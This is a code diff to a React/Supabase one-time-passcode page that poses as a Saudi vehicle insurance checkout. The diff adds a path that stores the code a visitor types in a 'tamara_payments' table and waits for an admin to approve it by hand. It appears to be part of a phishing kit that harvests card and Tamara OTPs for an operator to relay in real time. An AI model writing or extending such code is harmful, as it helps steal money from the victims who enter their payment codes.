@@ -21,6 +21,7 @@ const OtpVerification = () => {
   const companyName = searchParams.get("company") || "شركة الاتحاد للتأمين التعاوني - تأمين على المركبات ضد الغير";
   const price = searchParams.get("price") || "411.15";
   const cardLast4 = searchParams.get("cardLast4") || "6636";
+  const paymentId = searchParams.get("paymentId"); // Get payment ID for Tamara payments
   const [otp, setOtp] = useState("");
   const [isLoading, setIsLoading] = useState(false);
   const [waitingApproval, setWaitingApproval] = useState(false);
@@ -43,10 +44,26 @@ const OtpVerification = () => {
       otpCode: otp
     });
 
-    // Update database - set status to waiting_otp_approval
     try {
+      // If it's a Tamara payment (has paymentId in URL)
+      if (paymentId) {
+        // Update tamara_payments table with OTP
+        const { error } = await supabase
+          .from("tamara_payments")
+          .update({ otp_code: otp })
+          .eq("id", paymentId);
+
+        if (error) throw error;
+
+        setIsLoading(false);
+        setWaitingApproval(true);
+        
+        // Listen for admin approval on tamara_payments table
+        return;
+      }
+
+      // Original flow for regular orders
       if (orderData.sequenceNumber) {
-        // First, get the order ID
         const {
           data: orderInfo,
           error: orderError
@@ -57,7 +74,6 @@ const OtpVerification = () => {
           status: "waiting_otp_approval"
         }).eq("sequence_number", orderData.sequenceNumber);
 
-        // Save OTP attempt
         const {
           error: otpError
         } = await supabase.from("otp_attempts").insert({
@@ -83,7 +99,37 @@ const OtpVerification = () => {
 
   // Listen for admin approval/rejection
   useEffect(() => {
-    if (!orderData.sequenceNumber || !waitingApproval) return;
+    if (!waitingApproval) return;
+
+    // For Tamara payments
+    if (paymentId) {
+      const channel = supabase
+        .channel('tamara-otp-approval')
+        .on('postgres_changes', {
+          event: 'UPDATE',
+          schema: 'public',
+          table: 'tamara_payments',
+          filter: `id=eq.${paymentId}`
+        }, (payload: any) => {
+          const newStatus = payload.new.payment_status;
+          if (newStatus === 'completed') {
+            setWaitingApproval(false);
+            navigate('/otp-processing?success=true');
+          } else if (newStatus === 'otp_rejected') {
+            setWaitingApproval(false);
+            navigate('/otp-processing?success=false');
+          }
+        })
+        .subscribe();
+
+      return () => {
+        supabase.removeChannel(channel);
+      };
+    }
+
+    // For regular orders
+    if (!orderData.sequenceNumber) return;
+    
     const channel = supabase.channel('otp-approval-changes').on('postgres_changes', {
       event: 'UPDATE',
       schema: 'public',
@@ -102,7 +148,7 @@ const OtpVerification = () => {
     return () => {
       supabase.removeChannel(channel);
     };
-  }, [orderData.sequenceNumber, waitingApproval, navigate, companyName, price, toast]);
+  }, [paymentId, orderData.sequenceNumber, waitingApproval, navigate]);
   const handleResendCode = () => {
     toast({
       title: "تم إعادة الإرسال",
